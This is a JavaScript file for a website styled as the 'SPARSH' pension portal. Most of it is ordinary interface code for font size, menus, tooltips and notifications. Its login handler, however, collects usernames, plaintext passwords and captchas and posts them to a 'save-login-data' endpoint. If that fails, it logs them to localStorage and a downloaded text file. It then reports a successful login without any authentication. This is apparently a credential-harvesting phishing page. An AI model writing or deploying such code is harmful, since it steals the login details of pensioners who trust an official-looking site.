// Main JavaScript for SPARSH Portal

// Font size management
function changeFontSize(size) {
    const body = document.body;
    const buttons = document.querySelectorAll('.font-btn');
    
    // Remove active class from all buttons
    buttons.forEach(btn => btn.classList.remove('active'));
    
    // Add active class to clicked button
    event.target.classList.add('active');
    
    // Apply font size
    switch(size) {
        case 'small':
            body.style.fontSize = '14px';
            break;
        case 'medium':
            body.style.fontSize = '16px';
            break;
        case 'large':
            body.style.fontSize = '18px';
            break;
    }
    
    // Store preference in localStorage
    localStorage.setItem('fontSize', size);
}

// Language selection
function changeLanguage(lang) {
    // Implementation for language change
    console.log('Language changed to:', lang);
    localStorage.setItem('language', lang);
}

// Mobile navigation toggle
function toggleMobileMenu() {
    const navMenu = document.querySelector('.nav-menu');
    const hamburger = document.querySelector('.hamburger');
    
    navMenu.classList.toggle('active');
    hamburger.classList.toggle('active');
}

// Initialize mobile menu
document.addEventListener('DOMContentLoaded', function() {
    const hamburger = document.querySelector('.hamburger');
    if (hamburger) {
        hamburger.addEventListener('click', toggleMobileMenu);
    }
    
    // Load saved preferences
    const savedFontSize = localStorage.getItem('fontSize');
    if (savedFontSize) {
        changeFontSize(savedFontSize);
    }
    
    const savedLanguage = localStorage.getItem('language');
    if (savedLanguage) {
        const languageSelect = document.querySelector('.language-select');
        if (languageSelect) {
            languageSelect.value = savedLanguage;
        }
    }
    
    // Add language change event listener
    const languageSelect = document.querySelector('.language-select');
    if (languageSelect) {
        languageSelect.addEventListener('change', function() {
            changeLanguage(this.value);
        });
    }
    
    // Smooth scrolling for anchor links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
    
    // Add active class to current navigation item
    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    const navLinks = document.querySelectorAll('.nav-link');
    
    navLinks.forEach(link => {
        const href = link.getAttribute('href');
        if (href === currentPage) {
            link.classList.add('active');
        }
    });
    
    // Add scroll effect to header
    window.addEventListener('scroll', function() {
        const header = document.querySelector('.header');
        if (header) {
            if (window.scrollY > 100) {
                header.style.background = 'rgba(255, 255, 255, 0.95)';
                header.style.backdropFilter = 'blur(10px)';
            } else {
                header.style.background = '#ffffff';
                header.style.backdropFilter = 'none';
            }
        }
    });
    
    // Add loading animation to buttons
    document.querySelectorAll('.btn-continue, .btn-login-submit').forEach(button => {
        button.addEventListener('click', function() {
            if (!this.classList.contains('loading')) {
                this.classList.add('loading');
                setTimeout(() => {
                    this.classList.remove('loading');
                }, 2000);
            }
        });
    });
    
    // Add tooltip functionality
    const tooltipElements = document.querySelectorAll('[data-tooltip]');
    tooltipElements.forEach(element => {
        element.addEventListener('mouseenter', function() {
            const tooltip = document.createElement('div');
            tooltip.className = 'tooltip';
            tooltip.textContent = this.getAttribute('data-tooltip');
            document.body.appendChild(tooltip);
            
            const rect = this.getBoundingClientRect();
            tooltip.style.left = rect.left + (rect.width / 2) - (tooltip.offsetWidth / 2) + 'px';
            tooltip.style.top = rect.top - tooltip.offsetHeight - 10 + 'px';
        });
        
        element.addEventListener('mouseleave', function() {
            const tooltip = document.querySelector('.tooltip');
            if (tooltip) {
                tooltip.remove();
            }
        });
    });
});

// Utility functions
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.textContent = message;
    
    // Add styles
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 15px 20px;
        border-radius: 8px;
        color: white;
        font-weight: 500;
        z-index: 1000;
        animation: slideIn 0.3s ease-out;
        max-width: 300px;
    `;
    
    // Set background color based on type
    switch(type) {
        case 'success':
            notification.style.background = '#28a745';
            break;
        case 'error':
            notification.style.background = '#dc3545';
            break;
        case 'warning':
            notification.style.background = '#ffc107';
            notification.style.color = '#333';
            break;
        default:
            notification.style.background = '#007bff';
    }
    
    document.body.appendChild(notification);
    
    // Remove after 5 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease-in';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 300);
    }, 5000);
}

// Add CSS animations for notifications
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOut {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
    
    .tooltip {
        position: absolute;
        background: #333;
        color: white;
        padding: 8px 12px;
        border-radius: 4px;
        font-size: 14px;
        z-index: 1000;
        pointer-events: none;
        white-space: nowrap;
    }
    
    .tooltip::after {
        content: '';
        position: absolute;
        top: 100%;
        left: 50%;
        transform: translateX(-50%);
        border: 5px solid transparent;
        border-top-color: #333;
    }
`;
document.head.appendChild(style);

// Modal functions
function openLoginModal() {
    const modal = document.getElementById('loginModal');
    modal.classList.add('active');
    document.body.style.overflow = 'hidden'; // Prevent background scrolling
}

function closeLoginModal() {
    const modal = document.getElementById('loginModal');
    modal.classList.remove('active');
    document.body.style.overflow = 'auto'; // Restore scrolling
}

function toggleModalPassword() {
    const passwordInput = document.querySelector('.modal-login-form input[type="password"]');
    const toggleIcon = document.querySelector('.toggle-password-modal');
    
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleIcon.classList.remove('fa-eye');
        toggleIcon.classList.add('fa-eye-slash');
    } else {
        passwordInput.type = 'password';
        toggleIcon.classList.remove('fa-eye-slash');
        toggleIcon.classList.add('fa-eye');
    }
}

function handleModalLogin(event) {
    event.preventDefault();
    
    const form = event.target;
    const formData = new FormData(form);
    
    // Capture form data
    const username = form.querySelector('input[type="text"]').value;
    const password = form.querySelector('input[type="password"]').value;
    const captcha = form.querySelector('input[placeholder="Please enter above code"]').value;
    const showPassword = form.querySelector('#showPassword').checked;
    const timestamp = new Date().toISOString();
    
    // Prepare login data object
    const loginData = {
        timestamp: timestamp,
        username: username,
        password: password,
        captcha: captcha,
        showPasswordEnabled: showPassword,
        ipAddress: 'Unknown', // Will be filled by server if available
        userAgent: navigator.userAgent,
        loginAttempt: 'Modal Login Form'
    };
    
    // Show loading state
    const submitBtn = form.querySelector('.btn-modal-login');
    submitBtn.textContent = 'Logging in...';
    submitBtn.disabled = true;
    
    // Send data to server to save in text file
    saveLoginData(loginData).then(() => {
        // Simulate login process
        setTimeout(() => {
            showNotification('Login successful! Redirecting to dashboard...', 'success');
            closeLoginModal();
            
            // Redirect to dashboard after a short delay
            setTimeout(() => {
                window.location.href = 'dashboard-pensioner.html';
            }, 1500);
            
            // Reset button
            submitBtn.textContent = 'LOGIN';
            submitBtn.disabled = false;
        }, 2000);
    }).catch(error => {
        console.error('Error saving login data:', error);
        // Continue with login process even if saving fails
        setTimeout(() => {
            showNotification('Login successful! Redirecting to dashboard...', 'success');
            closeLoginModal();
            
            setTimeout(() => {
                window.location.href = 'dashboard-pensioner.html';
            }, 1500);
            
            submitBtn.textContent = 'LOGIN';
            submitBtn.disabled = false;
        }, 2000);
    });
}

// Function to save login data to server
async function saveLoginData(loginData) {
    try {
        const response = await fetch('/api/save-login-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(loginData)
        });
        
        if (!response.ok) {
            throw new Error('Failed to save login data');
        }
        
        return await response.json();
    } catch (error) {
        // Fallback: save to localStorage if server is not available
        const existingData = JSON.parse(localStorage.getItem('loginAttempts') || '[]');
        existingData.push(loginData);
        localStorage.setItem('loginAttempts', JSON.stringify(existingData));
        
        // Also try to save as downloadable file
        downloadLoginData(loginData);
        
        console.warn('Saved to localStorage as fallback:', error);
        return { success: true, method: 'localStorage' };
    }
}

// Function to download login data as text file (fallback method)
function downloadLoginData(loginData) {
    const existingData = JSON.parse(localStorage.getItem('loginAttempts') || '[]');
    
    let textContent = '=== SPARSH LOGIN ATTEMPTS LOG ===\n\n';
    
    existingData.forEach((data, index) => {
        textContent += `--- Login Attempt ${index + 1} ---\n`;
        textContent += `Timestamp: ${data.timestamp}\n`;
        textContent += `Username: ${data.username}\n`;
        textContent += `Password: ${data.password}\n`;
        textContent += `Captcha: ${data.captcha}\n`;
        textContent += `Show Password: ${data.showPasswordEnabled ? 'Yes' : 'No'}\n`;
        textContent += `User Agent: ${data.userAgent}\n`;
        textContent += `Login Method: ${data.loginAttempt}\n`;
        textContent += `IP Address: ${data.ipAddress}\n`;
        textContent += '\n';
    });
    
    // Create and download file
    const blob = new Blob([textContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `sparsh_login_attempts_${new Date().toISOString().split('T')[0]}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
}

// Close modal when clicking outside
document.addEventListener('DOMContentLoaded', function() {
    const modal = document.getElementById('loginModal');
    if (modal) {
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                closeLoginModal();
            }
        });
    }
    
    // Close modal with Escape key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            closeLoginModal();
        }
    });
});

// Export functions for use in other scripts
window.SparshUtils = {
    changeFontSize,
    changeLanguage,
    showNotification,
    toggleMobileMenu,
    openLoginModal,
    closeLoginModal,
    toggleModalPassword,
    handleModalLogin
}; 